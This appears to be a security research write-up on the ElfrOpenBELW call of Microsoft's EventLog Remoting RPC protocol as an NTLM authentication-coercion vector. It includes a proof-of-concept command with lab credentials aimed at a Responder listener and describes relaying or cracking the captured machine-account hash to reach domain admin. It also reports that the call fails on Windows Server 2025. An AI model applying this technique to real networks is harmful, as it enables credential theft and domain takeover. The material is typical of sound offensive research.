# MS-EVEN - Remote call to ElfrOpenBELW (opnum 9)

## Summary

+ **Protocol**: [[MS-EVEN]: EventLog Remoting Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)

+ **Protocol UUID**: 82273fdc-e32a-18c3-3f78-827929dc23ea

+ **Protocol version**: 0.0

+ **SMB Named pipe**: `\PIPE\eventlog`

+ **Function name**: [`ElfrOpenBELW`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)

+ **Function operation number**: `9`

+ **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `\PIPE\eventlog` and bind to the desired [`MS-EVEN`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f) protocol (with uuid `82273fdc-e32a-18c3-3f78-827929dc23ea` and version `0.0`) in order to perform remote procedure calls to functions in the [`MS-EVEN`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\PIPE\eventlog` This pipe is connected to the protocol [[MS-EVEN]: EventLog Remoting Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f) and allows to call RPC functions of this protocol. We will then call the remote [`ElfrOpenBELW`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
ElfrOpenBELW('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
NTSTATUS ElfrOpenBELW(
   [in] EVENTLOG_HANDLE_W UNCServerName,
   [in] PRPC_UNICODE_STRING BackupFileName,
   [in] unsigned long MajorVersion,
   [in] unsigned long MinorVersion,
   [out] IELF_HANDLE* LogHandle
 );
```


## Testing status — NOT a coercion vector on Windows Server 2025 (legacy open interface returns STATUS_INVALID_PARAMETER)

`ElfrOpenBELW` was investigated as a coercion primitive: `BackupFileName` is the path of a backup
event log that the Event Log service (running as the machine account) **opens** to read, so a UNC
path (`\\<listener>\share\x.evt`) would coerce outbound authentication. The Event Log service is
present on every Windows host and reachable over `\PIPE\eventlog`, which would make this a broad,
low-friction vector.

Tested against **Windows Server 2025** (domain controller) over `\PIPE\eventlog`
(interface `82273fdc-e32a-18c3-3f78-827929dc23ea`), 2026-09-14:

- The legacy MS-EVEN interface **requires RPC-level authentication** on this build: an unauthenticated
  (or `CONNECT`/`PKT`-level) bind is rejected `rpc_s_access_denied`. Only `PKT_INTEGRITY` /
  `PKT_PRIVACY` (NTLM) are accepted.
- With authentication, `ElfrOpenBELW` returns **`0xC000000D` STATUS_INVALID_PARAMETER** for **every**
  `BackupFileName` form tried — plain UNC (`\\host\share\file.evt`), `\??\UNC\...`,
  `\GLOBALROOT\Device\Mup\...`, and local paths (`C:\Windows\Temp\file.evt`, and even a real existing
  `C:\Windows\System32\winevt\Logs\Application.evtx`). The **listener recorded zero outbound
  connections** — the server rejects the call before opening the file.
- **Calibration:** the canonical `ElfrOpenELW("Application")` (open the live Application log — a
  normally-working call) returns the **same** `STATUS_INVALID_PARAMETER` on this build, across all
  string / `RegModuleName` / auth-level combinations. Because a known-good open fails identically, the
  failure is not specific to `BackupFileName` or to UNC paths: **the legacy MS-EVEN open operations
  are non-functional / hardened on Windows Server 2025** (the live service is the modern MS-EVEN6
  `wevtsvc`), so `BackupFileName` is never dereferenced and no coercion occurs.

The same conclusion applies to the sibling backup-path calls on this interface — `ElfrBackupELFW`
(opnum 1) and `ElfrClearELFW` (opnum 0), whose `BackupFileName` is only reached after a successful
`ElfrOpenELW`/`ElfrOpenBELW` handle open (which fails as above) — and to their ANSI variants
(`ElfrOpenBELA` / `ElfrBackupELFA` / `ElfrClearELFA`). The behavior is implementation-provided and
could differ on older Windows Server releases where the legacy open interface is functional.

## References

+ Documentation of protocol [MS-EVEN]: EventLog Remoting Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f

+ Documentation of function `ElfrOpenBELW`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1